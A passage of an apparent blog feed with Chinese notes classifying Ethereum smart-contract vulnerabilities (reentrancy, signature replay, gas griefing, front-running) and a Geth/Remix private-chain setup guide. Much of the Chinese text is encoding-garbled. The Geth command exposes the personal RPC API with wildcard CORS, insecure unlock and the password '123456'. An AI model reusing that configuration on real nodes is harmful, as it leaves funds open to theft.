disorder</p><p>ä¸»è¦æ˜¯åµŒå¥—è°ƒç”¨é“¾å¼‚å¸¸å¤„ç†ä¸å½“</p></li></ol><h2 id="å§”æ‰˜ç®¡ç†-proxy-replay">å§”æ‰˜ç®¡ç† proxy replay</h2><ol type="1"><li><p>Improper Verification of Cryptographic Signature/Signature ReplayAttacks</p><ol type="1"><li><p>Signature Malleability -- SWC-117</p><p><code>ecrecover</code> A signature should never be included into asigned message hash to check if previously messages have been processedby the contract.</p></li><li><p>Missing Protection against Signature Replay Attacks --SWC-121</p><p>å¢åŠ å¯¹é‡æ”¾æ”»å‡»çš„ä¿æŠ¤ï¼Œæ¯”å¦‚: 1.ä¿å­˜æ¯æ¬¡æ¶ˆæ¯çš„ hash 2.Include theaddress of the contract that processes the messageï¼Œ 3. SWC-117</p></li><li><p>Lack of Proper Signature Verification -- SWC-122</p><p>sign messages off-chain. This can lead to vulnerabilities especiallyin scenarios where proxies can be used to relay transactions.</p></li></ol></li><li><p>Authentication Bypass by Capture-replay</p><p>Hash Collisions With Multiple Variable Length Arguments</p></li><li><p>Insufficient Gas Griefing</p><pre><code>subcall fail1. Require Gasleft ä¿è¯ subcall å®Œæˆ2. Permit only trusted accounts to relay the transaction.</code></pre></li><li><p>Meta transactions Relay</p><p>è½¬å‘è€…ä¸æ–­æä¾›è¾ƒå°‘ gas ä½¿å…¶å¤±è´¥ï¼Œä»è€Œä¸æ–­è·å– ether æˆ–è€…å½¢æˆDos</p></li></ol><h2 id="authorization-improper-access-control">Authorization/ ImproperAccess Control</h2><ol type="1"><li><p>unintentionally exposing initialization functionsã€‚such asConstructor ä¹Ÿå¯ä»¥è¯´æ˜¯åˆå§‹åŒ–å‡½æ•°å¯è§æ€§é—®é¢˜ -- è§ SWC-105</p><p>Unprotected Ether Withdrawal/Functions that send ether to arbitrarydestinations</p></li><li><p>Unprotected SELFDESTRUCT Instruction/functionality /suicide</p></li><li><p>Function Default Visibility -- Improper Adherence to CodingStandard</p></li><li><p>State Variable Default Visibility/Implicit visibilitylevel(ä¸æ˜ç¡®æŒ‡å®šå¯è§æ€§ï¼‰</p></li><li><p>Use of Obsolete Function</p><p>Authorization through tx.origin</p></li><li><p>Keeping secrets/Unencrypted Private Data On-Chain</p></li><li><p><ahref="https://docs.guardrails.io/docs/en/vulnerabilities/solidity/write_to_arbitrary_storage_location">Writeto Arbitrary Storage Location</a></p></li><li><p>å˜é‡è¦†ç›–é—®é¢˜å¯¼è‡´ä»»æ„å­˜å‚¨åœ°å€å†™</p><p>å¯ä»¥æ§åˆ¶æ•°ç»„åç§»æ—¶</p></li><li><p>HASH ç¢°æ’</p><p><a href="https://paper.seebug.org/739/">ä»ä¸€èµ·â€œç›—å¸â€äº‹ä»¶çœ‹ä»¥å¤ªåŠå­˜å‚¨hash ç¢°æ’é—®é¢˜</a></p></li></ol><p>æƒé™ç®¡ç†ï¼Œå¯å°±å®½æ³›äº†ï¼Œè¿˜æœ‰å¥½äº›å¯ä»¥å½’åˆ°æƒé™ç®¡ç†é‡Œé¢</p><h2 id="contract-interaction">Contract interaction</h2><ol type="1"><li><p>Unchecked low-level call (SWC-104, DASP-4, SP-9)</p></li><li><p>Reentrancy (SWC-107, DASP-1, SP-1)</p></li><li><p>Dos with external call</p></li><li><p>DoS with revert/DoS with Failed Call (SWC-113, SP-11)</p></li><li><p>DoS with selfdestruct (DASP-5)</p></li><li><p>Insufficient Gas Griefing</p><pre><code>subcall fail1. Require Gasleft ä¿è¯ subcall å®Œæˆ2. Permit only trusted accounts to relay the transaction.</code></pre></li><li><p>Meta transactions Relay è½¬å‘è€…ä¸æ–­æä¾›è¾ƒå°‘ gasä½¿å…¶å¤±è´¥ï¼Œä»è€Œä¸æ–­è·å– ether æˆ–è€…å½¢æˆ Dos</p></li></ol><h2 id="low-level-focus">Low-level focus</h2><ol type="1"><li><p>Use of Low-Level Functionality/use assembly instructions</p><ol type="1"><li>Arbitrary Jump with Function Type Variable</li></ol></li><li><p>Uncheck low-level call return Value</p></li><li><p>Constant functions using assembly code</p></li></ol><h2id="entropy-illusionweak-sources-of-randomness-from-chain-attributesuse-of-insufficiently-random-valuesentropy-illusion">EntropyIllusion/Weak Sources of Randomness from Chain Attributes/Use ofInsufficiently Random Values/Entropy Illusion</h2><ol type="1"><li><p>UnsafeDependenceOnBlock</p><ol type="1"><li><code>block.timestamp</code>/Block values as a proxy fortime/Timestamp dependence</li><li><code>block Number</code> Block Number Dependency</li><li><code>blockhash</code></li><li><code>block.difficulty</code></li></ol></li><li><p>UnsafeDependenceOnGas</p></li></ol><h2 id="block-content-manipulation">Block content manipulation</h2><p>Miner assembles block and thus can influence its contents (includedtransactions, their order, other block parameters).</p><p>Front-running / transaction reordering (SWC-114, DASP-7, SP-10)Timestamp manipulation (SWC-116, DASP-8, SP-12) Random with blockhash(SWC-120, DASP-6, SP-6) Transaction censorship (link)</p><h2 id="å‚ç…§">å‚ç…§</h2><p><a href="https://swcregistry.io/">SWC Registry</a> <ahref="https://github.com/smartdec/classification">Classification ofsmart contract vulnerabilities</a> <ahref="https://consensys.github.io/smart-contract-best-practices/known_attacks/">KnownAttacks</a> <ahref="https://medium.com/consensys-diligence/silent-but-vulnerable-ethereum-gas-security-concerns-adadf8bfb180">SilentBut Vulnerable: Ethereum Gas Security Concerns</a> <ahref="https://blog.sigmaprime.io/solidity-security.html">SoliditySecurity: Comprehensive list of known attack vectors and commonanti-patterns</a> <ahref="https://github.com/ethereum/wiki/wiki/Safety">ethereum wiki</a> <ahref="https://www.cnblogs.com/XBWer/p/9697361.html#1">æ™ºèƒ½åˆçº¦çš„å¸¸è§æ¼æ´</a><ahref="https://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilites-review/">ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦å®‰å…¨å…¥é—¨äº†è§£ä¸€ä¸‹ï¼ˆä¸Šï¼‰</a><ahref="https://www.8btc.com/article/331416">åŒºå—é“¾æ™ºèƒ½åˆçº¦å®‰å…¨å®¡è®¡ç™½çš®ä¹¦ï¼ˆ2018å¹´ï¼‰è§£è¯»</a> <a href="https://paper.seebug.org/633/">ä»¥å¤ªåŠ Solidityåˆçº¦ call å‡½æ•°ç°‡æ»¥ç”¨å¯¼è‡´çš„å®‰å…¨é£é™©</a></p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>remix è¿æ¥ä½¿ç”¨ Geth</title>
      <link href="/blog/2021/04/20/blockchain/3.develop2/"/>
      <url>/blog/2021/04/20/blockchain/3.develop2/</url>
      
        <content type="html"><![CDATA[<h1 id="geth">Geth</h1><p>é€šè¿‡ remix è¿æ¥ web3provider ç›´æ¥éƒ¨ç½²ï¼Œä¸ºç§é“¾æ·»åŠ ä½™é¢<code>miner.start()</code> ç„¶å <code>miner.stop()</code></p><p><ahref="https://ethereum.stackexchange.com/questions/16253/how-can-i-add-some-balance-to-the-address-in-private-blockchain-testnet">Howcan I add some balance to the address in private blockchain testnet? -Ethereum Stack Exchange</a> <ahref="https://ethereum.stackexchange.com/questions/16040/why-did-it-returned-null-after-call-miner-start">goethereum - why did it returned null after call miner.start() - EthereumStack Exchange</a></p><p>remix å‘èµ·äº¤æ˜“æŠ¥é”™ç¼ºå°‘ SHR è§£å†³ï¼š<ahref="https://ethereum.stackexchange.com/questions/87245/error-returned-error-invalid-opcode-shr">goethereum - Error: Returned error: invalid opcode: SHR - Ethereum StackExchange</a></p><p>remixç‚¹å‡»éƒ¨ç½²ä»¥åï¼Œå¯ä»¥çœ‹ä¸‹æ–¹çš„éƒ¨ç½²æ—¥å¿—æ¥åˆ¤æ–­å…¶åœ¨éƒ¨ç½²ï¼Œè¿˜æ˜¯æœ‰é”™è¯¯ã€‚</p><ul><li>åˆ›å»ºç§é“¾: <code>geth --datadir . init genesis.json</code></li><li>åˆ›å»ºæ–°è´¦æˆ·: <code>geth account new</code></li><li>è¿›å…¥äº¤äº’çª—å£:<code>geth --identity "user_id" --rpc --rpccorsdomain "*" --datadir "./" --port "30303" --nodiscover --rpcapi "personal,db,eth,net,web3,miner" --networkid 15 console 2&gt;&gt;geth.log --allow-insecure-unlock</code></li><li>åˆ›å»ºæ–°é’±åŒ…åœ°å€: <code>personal.newAccount("123456")</code></li><li>æŸ¥çœ‹é’±åŒ…åœ°å€: <code>eth.accounts</code></li><li>æŒ–çŸ¿ï¼Œè·å¾— eth:<code>miner.start()</code>ã€<code>miner.stop()</code></li><li>unlock åœ°å€ï¼Œä»¥ä¾¿ä½¿ç”¨å…¶éƒ¨ç½²åˆçº¦:<code>personal.unlockAccount(eth.accounts[0])</code></li><li>remix è¿æ¥ web3providerï¼Œéƒ¨ç½²åˆ° gethã€‚å…ˆç‚¹å‡» deploy éƒ¨ç½²åˆçº¦,ç„¶åæŒ–çŸ¿ï¼Œå¯¹è¯¥äº¤æ˜“è¿›è¡Œæ‰“åŒ…ï¼š<code>miner.start()</code>ã€<code>miner.stop()</code></li></ul><h2 id="é˜…è¯»">é˜…è¯»</h2><p><ahref="https://blog.csdn.net/huwh_/article/details/80977642">ä»¥å¤ªåŠç³»åˆ—ï¼ˆäºŒï¼‰ä¹‹è´¦æˆ·ç®¡ç†_èƒ¡ä¼Ÿç…Œçš„åšå®¢-CSDNåšå®¢</a> <ahref="https://blog.csdn.net/Damionew/article/details/104687053">ã€åŒºå—é“¾ã€‘é—®é¢˜é›†é”¦ï¼ˆæŒç»­æ›´æ–°ï¼‰_Damionewçš„åšå®¢-CSDN åšå®¢</a> <ahref="http://www.wangxiaoming.com/blog/2018/01/22/HPB-41-ETH-3j-Smart/">HPB41ï¼šWeb3jå®ç°æ™ºèƒ½åˆçº¦ - æ±ªæ™“æ˜å¯¹åŒºå—é“¾ã€ä»¥å¤ªåŠçš„æ€è€ƒ</a> <ahref="https://blog.csdn.net/huwh_/article/details/80977642">ä»¥å¤ªåŠç³»åˆ—ï¼ˆäºŒï¼‰ä¹‹è´¦æˆ·ç®¡ç†_èƒ¡ä¼Ÿç…Œçš„åšå®¢-CSDNåšå®¢</a></p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ™ºèƒ½åˆçº¦æ¼æ´è°ƒç ”è¡¥å……</title>
      <link href="/blog/2021/04/15/blockchain/eth_vulns/eth_vulns_2/"/>
      <url>/blog/2021/04/15/blockchain/eth_vulns/eth_vulns_2/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¼æ´åˆ†ç±»">æ¼æ´åˆ†ç±»</h1><ol type="1"><li><p>Incorrect Calculation/arithmetic issues <a href="#fn1"class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>Integer bugs</p><ol type="1"><li><p>arithmetic bugs</p><p>Integer Overflow and Underflow Division by zero or modulo zero,2ï¼‰truncation bugs /multiply before divison/Imprecise arithmeticoperations order 3ï¼‰signedness bugs ç›®å‰ç²¾é€šæ•´å‹æº¢å‡ºæ¼æ´çš„å·¥å…·:</p></li></ol><ol type="1"><li>Osiris Integer bugs è®ºæ–‡</li><li><a href="https://paper.seebug.org/626/">ERC20æ™ºèƒ½åˆçº¦æ•´æ•°æº¢å‡ºç³»åˆ—æ¼æ´æŠ«éœ²</a>æåˆ°ä¸€ä¸ªè‡ªåŠ¨åŒ–å·¥å…·å¯ä»¥é«˜æ•ˆæŒ–æ˜é«˜å±æ•´æ•°æº¢å‡ºæ¼æ´ï¼Œæ£€æµ‹å‡ºäº†æ–‡ä¸­å¾ˆå¤šæ¼æ´</li></ol></li><li><p>Use of Incorrect Operator/Typographical Error</p><p>The unary + operator is deprecated in new solidity compilerversions.</p></li><li><p>Using Components with Known Vulnerabilities</p><ol type="1"><li>Outdated Compiler Version</li><li>Compiler version not fixed / Floating Pragma</li></ol></li><li><p>Unchecked Return Value / Handle errors in external calls <ahref="#fn2" class="footnote-ref" id="fnref2"role="doc-noteref"><sup>2</sup></a></p><p>Unchecked Call Return Value Uncheck low-level call</p></li><li><p><ahref="https://cwe.mitre.org/data/definitions/284.html">CWE-284: ImproperAccess Control</a> <a href="#fn3" class="footnote-ref" id="fnref3"role="doc-noteref"><sup>3</sup></a></p><ol type="1"><li><p>Unprotected Ether Withdrawal</p><p>unintentionally exposing initialization functionsã€‚such asConstructor ä¹Ÿå¯ä»¥è¯´æ˜¯åˆå§‹åŒ–å‡½æ•°å¯è§æ€§é—®é¢˜ -- è§ SWC-105</p></li><li><p>Unprotected SELFDESTRUCT Instruction/functionality / suicide <ahref="#fn4" class="footnote-ref" id="fnref4"role="doc-noteref"><sup>4</sup></a></p></li><li><p>Function Default Visibility -- Improper Adherence to CodingStandards<a href="#fn5" class="footnote-ref" id="fnref5"role="doc-noteref"><sup>5</sup></a></p></li><li><p>State Variable Default Visibility/Implicit visibilitylevel(ä¸æ˜ç¡®æŒ‡å®šå¯è§æ€§ï¼‰<a href="#fn6" class="footnote-ref" id="fnref6"role="doc-noteref"><sup>6</sup></a></p></li><li><p>Owner æƒé™é—®é¢˜ é¿å… owner æƒé™è¿‡å¤§</p></li></ol></li><li><p>Improper Adherence to Coding Standards</p><ol type="1"><li><p>Shadowing State Variables [^write]</p></li><li><p>Function Default Visibility</p></li><li><p>Freezing ether<a href="#fn7" class="footnote-ref" id="fnref7"role="doc-noteref"><sup>7</sup></a></p><p>åªæœ‰æ”¶é’±ï¼Œè½¬è´¦å§”æ‰˜ç»™å…¶ä»–åˆçº¦ï¼Œdelegatecallï¼Œå¦‚æœå…¶ä»–åˆçº¦æ­»äº†ï¼Œå°±é€ æˆæ­¤é—®é¢˜</p></li><li><p>Ether lost in transfer</p><p>è½¬å‘ç©ºåœ°å€</p></li></ol></li><li><p>Incorrect Inheritance Order[^control_flow]</p></li><li><p>Use of Obsolete Function</p><ol type="1"><li>Use of Deprecated Solidity Functions</li><li>Authorization through tx.origin[^authorization]<a href="#fn8"class="footnote-ref" id="fnref8"role="doc-noteref"><sup>8</sup></a></li></ol></li><li><p><ahref="https://cwe.mitre.org/data/definitions/841.html">CWE-841: ImproperEnforcement of Behavioral Workflow</a> è¡Œä¸ºå·¥ä½œæµçš„ä¸æ°å½“å®æ–½[^improper_enforcement_workflow]<a href="#fn9" class="footnote-ref"id="fnref9" role="doc-noteref"><sup>9</sup></a></p><ol type="1"><li><p>Reentrancy(a.k.a. recursive call attack) <a href="#fn10"class="footnote-ref" id="fnref10" role="doc-noteref"><sup>10</sup></a><ahref="#fn11" class="footnote-ref" id="fnref11"role="doc-noteref"><sup>11</sup></a></p><ol type="1"><li><p>Reentrancy on a Single Function</p></li><li><p>Cross-function Reentrancy</p></li><li><p>Reentrancy Mutex ä½¿ç”¨ä¸å½“ when you have multiple contracts thatneed to cooperate.</p><p>æ­»é”</p></li></ol></li></ol></li><li><p><ahref="https://cwe.mitre.org/data/definitions/670.html">CWE-670:Always-Incorrect Control Flow Implementation</a>[^control_flow]</p><ol type="1"><li>Assert Violation //å­˜åœ¨æŸæ¡æ§åˆ¶æµæ€»æ˜¯é”™è¯¯ 1. æœ‰ bug æˆ–è€… ä¸è¯¥ç”¨Assert</li></ol></li><li><p>Insufficient Control Flow Management [^control_flow]</p><ol type="1"><li><p>Insufficient Gas Griefing[^gas]<a href="#fn12"class="footnote-ref" id="fnref12"role="doc-noteref"><sup>12</sup></a></p><p>subcall fail</p><ol type="1"><li>Require Gasleft ä¿è¯ subcall å®Œæˆ</li><li>Permit only trusted accounts to relay the transaction.</li></ol></li><li><p>Meta transactions Relay [^gas]<a href="#fn13"class="footnote-ref" id="fnref13" role="doc-noteref"><sup>13</sup></a><ahref="#fn14" class="footnote-ref" id="fnref14"role="doc-noteref"><sup>14</sup></a><a href="#fn15" class="footnote-ref"id="fnref15" role="doc-noteref"><sup>15</sup></a> è½¬å‘è€…ä¸æ–­æä¾›è¾ƒå°‘ gasä½¿å…¶å¤±è´¥ï¼Œä»è€Œä¸æ–­è·å– ether æˆ–è€…å½¢æˆ Dos</p></li></ol></li><li><p>Call to the unknown <a href="#fn16" class="footnote-ref"id="fnref16" role="doc-noteref"><sup>16</sup></a></p><p>ä»£ç å†™é”™ï¼ŒæœªåŒ¹é…åˆ°ï¼Œé»˜è®¤è°ƒç”¨ fallback å‡½æ•°</p></li><li><p><ahref="https://cwe.mitre.org/data/definitions/829.html">CWE-829:Inclusion of Functionality from Untrusted Control Sphere</a><ahref="#fn17" class="footnote-ref" id="fnref17"role="doc-noteref"><sup>17</sup></a></p><ol type="1"><li>Delegatecall to Untrusted Callee</li></ol></li><li><p>Mishandled Exceptions/Improper Check or Handling of ExceptionalConditions/Exception disorder <a href="#fn18" class="footnote-ref"id="fnref18" role="doc-noteref"><sup>18</sup></a></p><ol type="1"><li>DoS with Failed External Call<a href="#fn19" class="footnote-ref"id="fnref19" role="doc-noteref"><sup>19</sup></a></li><li>æœªä½œé™åˆ¶çš„ DelegateCall</li></ol><p>å‚è€ƒ: <a href="https://paper.seebug.org/633/">ä»¥å¤ªåŠ Solidity åˆçº¦call å‡½æ•°ç°‡æ»¥ç”¨å¯¼è‡´çš„å®‰å…¨é£é™©</a></p></li><li><p>Call æ³¨å…¥<a href="#fn20" class="footnote-ref" id="fnref20"role="doc-noteref"><sup>20</sup></a></p></li><li><p>Improper Following of Specification by Caller<a href="#fn21"class="footnote-ref" id="fnref21"role="doc-noteref"><sup>21</sup></a></p><ol type="1"><li>Requirement Violation SWC-123</li></ol></li><li><p>Race Condition/Concurrent Execution using Shared Resource withImproper Synchronization</p><p>Front-runnig:<a href="#fn22" class="footnote-ref" id="fnref22"role="doc-noteref"><sup>22</sup></a> ç›®å‰æœ€å¸¸å‘ç”Ÿï¼š The ERC20 tokenstandard includes a function called 'approve'</p><ol type="1"><li><p>Displacement/é¡¶æ›¿</p></li><li><p>Insertion/Transaction Order Dependence æå‰æ’é˜Ÿï¼Œå€’å–</p></li><li><p>Suppression/Block Stuffing attacks/Transaction Congestion Attackæ‹¥æŒ¤å µå¡<a href="#fn23" class="footnote-ref" id="fnref23"role="doc-noteref"><sup>23</sup></a></p><p><a href="https://solmaz.io/2018/10/18/anatomy-block-stuffing/">TheAnatomy of a Block Stuffing Attack</a></p></li></ol></li><li><p>Weak Sources of Randomness from Chain Attributes/Use ofInsufficiently Random Values/Entropy Illusion<a href="#fn24"class="footnote-ref" id="fnref24"role="doc-noteref"><sup>24</sup></a></p><p><code>block.timestampã€blockhash</code> , Â <code>block.difficulty</code> <code>block Number</code> éƒ½æ˜¯ä¸å®‰å…¨çš„ 1.Block values as a proxy for time/Timestamp dependence 2. Block NumberDependency</p></li><li><p>Improper Verification of Cryptographic Signature/Signature ReplayAttacks[^authorization]</p><ol type="1"><li><p>Signature Malleability -- SWC-117</p><p><code>ecrecover</code> A signature should never be included into asigned message hash to check if previously messages have been processedby the contract.</p></li><li><p>Missing Protection against Signature Replay Attacks --SWC-121</p><p>å¢åŠ å¯¹é‡æ”¾æ”»å‡»çš„ä¿æŠ¤ï¼Œæ¯”å¦‚: 1.ä¿å­˜æ¯æ¬¡æ¶ˆæ¯çš„ hash 2.Include theaddress of the contract that processes the messageï¼Œ 3. SWC-117</p></li><li><p>Lack of Proper Signature Verification -- SWC-122</p><p>sign messages off-chain. This can lead to vulnerabilities especiallyin scenarios where proxies can be used to relay transactions.</p></li></ol></li><li><p>Write-what-where Condition</p><p>Write to Arbitrary Storage Location<a href="#fn25"class="footnote-ref" id="fnref25"role="doc-noteref"><sup>25</sup></a></p></li><li><p>Use of Low-Level Functionality/Assembly instructions</p><ol type="1"><li>Arbitrary Jump with Function Type Variable</li></ol></li><li><p>User Interface (UI) Misrepresentation of Critical Information</p><p>Right-To-Left-Override control character (U+202E)</p></li><li><p>Irrelevant Code/Dead code</p><ol type="1"><li>Presence of unused variables</li><li>Code With No Effects</li></ol></li><li><p>Improper Locking</p><p>Unexpected Ether balance/Forcibly Sending Ether to a Contract<ahref="#fn26" class="footnote-ref" id="fnref26"role="doc-noteref"><sup>26</sup></a> In the worst case scenario thiscould lead to DOS conditions that might render the contractunusable.</p></li><li><p>Keeping secrets/Unencrypted Private Data On-Chain<a href="#fn27"class="footnote-ref" id="fnref27"role="doc-noteref"><sup>27</sup></a></p><p>Access to Critical Private Variable via Public Method</p></li><li><p>Authentication Bypass by Capture-replay[^authorization]</p><p>Hash Collisions With Multiple Variable Length Arguments</p></li><li><p>Improper Initialization</p><p>Message call with hardcoded gas amount[^gas]</p></li><li><p>Gas</p><ol type="1"><li><p>Uncontrolled Resource Consumption</p><p>DoS With Block Gas Limit<a href="#fn28" class="footnote-ref"id="fnref28" role="doc-noteref"><sup>28</sup></a></p><ol type="1"><li><p>Gas Limit DoS on a Contract via Unbounded Operations/Loop over anarray of unknown size</p><p>lock Ether</p></li><li><p>Gas Limit DoS on the Network via Block Stuffing/Block Stuffingattacks/Transaction congestion Attack</p></li></ol><p>å®ƒä¸åªå¯ä»¥ç”¨æ¥æ¶ˆè€— Gasï¼Œ <ahref="https://medium.com/level-k/public-disclosure-malicious-gastoken-minting-236b2f8ace38">è¿˜å¯ä»¥é€šè¿‡GasToken æ¥å€’æˆé’±</a></p></li><li><p>GasLess Send</p></li></ol><p>å‚è€ƒï¼š<ahref="https://medium.com/consensys-diligence/silent-but-vulnerable-ethereum-gas-security-concerns-adadf8bfb180">SilentBut Vulnerable: Ethereum Gas Security Concerns</a></p></li><li><p>Dos<a href="#fn29" class="footnote-ref" id="fnref29"role="doc-noteref"><sup>29</sup></a></p><ol type="1"><li><p>DoS With Block Gas Limit</p><ol type="1"><li>DoS with Failed External Call/External calls without gas stipends<ahref="#fn30" class="footnote-ref" id="fnref30"role="doc-noteref"><sup>30</sup></a></li><li>Looping through externally manipulated mappings orarrays/é€šè¿‡å¤–éƒ¨æ“çºµæ˜ å°„æˆ–æ•°ç»„ï¼ˆArrayï¼‰å¾ªç¯</li></ol></li><li><p>Owner operations æ‰€æœ‰è€…æ“ä½œ</p></li><li><p>Progressing state based on external callsåŸºäºå¤–éƒ¨è°ƒç”¨çš„è¿›å±•çŠ¶æ€<a href="#fn31" class="footnote-ref" id="fnref31"role="doc-noteref"><sup>31</sup></a></p><p>è§ <ahref="https://blog.sigmaprime.io/solidity-security.html#dos">SoliditySecurity: Comprehensive list of known attack vectors and commonanti-patterns</a> <ahref="https://ethfans.org/posts/comprehensive-list-of-common-attacks-and-defense-part-6">ä¸­æ–‡ç¿»è¯‘</a></p></li><li><p>DoS with (Unexpected) revert <a href="#fn32" class="footnote-ref"id="fnref32" role="doc-noteref"><sup>32</sup></a></p><p>æ¶æ„é€€æ¬¾çš„ fallback å‡½æ•°</p></li></ol></li><li><p>Signature collisions: two different functions may have the samesignature</p></li><li><p>å‡å……å€¼é—®é¢˜ ä¸“é—¨åšå®ƒçš„: 1.<ahref="https://arxiv.org/pdf/1906.10362.pdf">EVulHunter: Detecting FakeTransfer Vulnerabilitiesfor EOSIOâ€™s Smart Contracts at Webassemblylevel</a> 2. çŸ¥é“åˆ›å®‡ 404/æ…¢é›¾å›¢é˜Ÿ</p></li></ol><h2 id="ç‰ˆæœ¬æ›´æ–°å·²è§£å†³">ç‰ˆæœ¬æ›´æ–°å·²è§£å†³</h2><ol type="1"><li><p><a href="https://swcregistry.io/docs/SWC-109">UninitializedStorage Pointer</a>~~~ compiler version 0.5.0 and higher å·²è§£å†³</p></li><li><p>Incorrect Constructor Name -- SWC-118 Solidity version 0.4.22å¼•å…¥äº† constructor å…³é”®å­—</p></li></ol><h2 id="å‚ç…§">å‚ç…§</h2><p><a href="https://swcregistry.io/">SWC Registry</a> <ahref="https://github.com/smartdec/classification">Classification ofsmart contract vulnerabilities</a> <ahref="https://consensys.github.io/smart-contract-best-practices/known_attacks/">KnownAttacks</a> <ahref="https://medium.com/consensys-diligence/silent-but-vulnerable-ethereum-gas-security-concerns-adadf8bfb180">SilentBut Vulnerable: Ethereum Gas Security Concerns</a> <ahref="https://blog.sigmaprime.io/solidity-security.html">SoliditySecurity: Comprehensive list of known attack vectors and commonanti-patterns</a> <ahref="https://github.com/ethereum/wiki/wiki/Safety">ethereum wiki</a> <ahref="https://www.cnblogs.com/XBWer/p/9697361.html#1">æ™ºèƒ½åˆçº¦çš„å¸¸è§æ¼æ´</a><ahref="https://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilites-review/">ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦å®‰å…¨å…¥é—¨äº†è§£ä¸€ä¸‹ï¼ˆä¸Šï¼‰</a><ahref="https://www.8btc.com/article/331416">åŒºå—é“¾æ™ºèƒ½åˆçº¦å®‰å…¨å®¡è®¡ç™½çš®ä¹¦ï¼ˆ2018å¹´ï¼‰è§£è¯»</a> <a href="https://paper.seebug.org/633/">ä»¥å¤ªåŠ Solidityåˆçº¦ call å‡½æ•°ç°‡æ»¥ç”¨å¯¼è‡´çš„å®‰å…¨é£é™©</a></p><h2 id="æƒ³æ³•æ€»ç»“">æƒ³æ³•æ€»ç»“</h2><p><a href="https://paper.seebug.org/633/">ä»¥å¤ªåŠ Solidity åˆçº¦ callå‡½æ•°ç°‡æ»¥ç”¨å¯¼è‡´çš„å®‰å…¨é£é™©</a> call å®‰å…¨æ¼æ´</p><aside id="footnotes" class="footnotes footnotes-end-of-document"role="doc-endnotes"><hr /><ol><li id="fn1"><p>ç®—æ•°æº¢å‡ºç­‰æ•°å­¦æ–¹é¢çš„é—®é¢˜<a href="#fnref1"class="footnote-back" role="doc-backlink">â†©ï¸</a></p></li><li id="fn2"><p>ä¸“é—¨æ£€æµ‹è¿”å›å€¼<a href="#fnref2" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn3"><p>ä¸“é—¨æ£€æµ‹æƒé™æ§åˆ¶<a href="#fnref3" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn4"><p>ï¼šä¸“é—¨æ£€æµ‹å¯ä»¥åˆçº¦æŸæ¯è‡ªæ€çš„<a href="#fnref4"class="footnote-back" role="doc-backlink">â†©ï¸</a></p></li><li id="fn5"><p>å±äºæƒé™æ§åˆ¶<a href="#fnref5" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn6"><p>å±äºæƒé™æ§åˆ¶<a href="#fnref6" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn7"><p>æ£€æµ‹ä¸å½“è°ƒç”¨ï¼Œä»è€Œæ£€æµ‹è°ƒç”¨å¼•èµ·çš„å¼‚å¸¸ç­‰å…¶ä»–å±é™©<ahref="#fnref7" class="footnote-back" role="doc-backlink">â†©ï¸</a></p></li><li id="fn8"><p>ä¸“é—¨æ£€æµ‹æƒé™æ§åˆ¶<a href="#fnref8" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn9"><p>é¡ºåºç›¸å…³ [^gas]ï¼šä¸ Gas ç›¸å…³çš„<a href="#fnref9"class="footnote-back" role="doc-backlink">â†©ï¸</a></p></li><li id="fn10"><p>ä¸ fallback å‡½æ•°ç›¸å…³çš„<a href="#fnref10"class="footnote-back" role="doc-backlink">â†©ï¸</a></p></li><li id="fn11"><p>æ£€æµ‹ä»åˆ«çš„åŸŸåŒ…å«/æ‰§è¡Œ(å¤–éƒ¨)ä»£ç çš„ç±»å‹<a href="#fnref11"class="footnote-back" role="doc-backlink">â†©ï¸</a></p></li><li id="fn12"><p>ä»£ç†è½¬å‘ç›¸å…³<a href="#fnref12" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn13"><p>ä»£ç†è½¬å‘ç›¸å…³<a href="#fnref13" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn14"><p>æ¼æ´<a href="#fnref14" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn15"><p>ether ç›¸å…³ï¼Œ1. æ”»å‡»è·å¾— 2. ä¸¢å¤± 3. é”å®š lock<ahref="#fnref15" class="footnote-back" role="doc-backlink">â†©ï¸</a></p></li><li id="fn16"><p>ä¸ fallback å‡½æ•°ç›¸å…³çš„<a href="#fnref16"class="footnote-back" role="doc-backlink">â†©ï¸</a></p></li><li id="fn17"><p>æ£€æµ‹ä¸å½“è°ƒç”¨ï¼Œä»è€Œæ£€æµ‹è°ƒç”¨å¼•èµ·çš„å¼‚å¸¸ç­‰å…¶ä»–å±é™©<ahref="#fnref17" class="footnote-back" role="doc-backlink">â†©ï¸</a></p></li><li id="fn18"><p>æ£€æµ‹ä¸å½“è°ƒç”¨ï¼Œä»è€Œæ£€æµ‹è°ƒç”¨å¼•èµ·çš„å¼‚å¸¸ç­‰å…¶ä»–å±é™©<ahref="#fnref18" class="footnote-back" role="doc-backlink">â†©ï¸</a></p></li><li id="fn19"><p>æ¼æ´<a href="#fnref19" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn20"><p>æ£€æµ‹ä¸å½“è°ƒç”¨ï¼Œä»è€Œæ£€æµ‹è°ƒç”¨å¼•èµ·çš„å¼‚å¸¸ç­‰å…¶ä»–å±é™©<ahref="#fnref20" class="footnote-back" role="doc-backlink">â†©ï¸</a></p></li><li id="fn21"><p>æ£€æµ‹ä¸å½“è°ƒç”¨ï¼Œä»è€Œæ£€æµ‹è°ƒç”¨å¼•èµ·çš„å¼‚å¸¸ç­‰å…¶ä»–å±é™©<ahref="#fnref21" class="footnote-back" role="doc-backlink">â†©ï¸</a></p></li><li id="fn22"><p>é¡ºåºç›¸å…³ [^gas]ï¼šä¸ Gas ç›¸å…³çš„<a href="#fnref22"class="footnote-back" role="doc-backlink">â†©ï¸</a></p></li><li id="fn23"><p>æ¼æ´<a href="#fnref23" 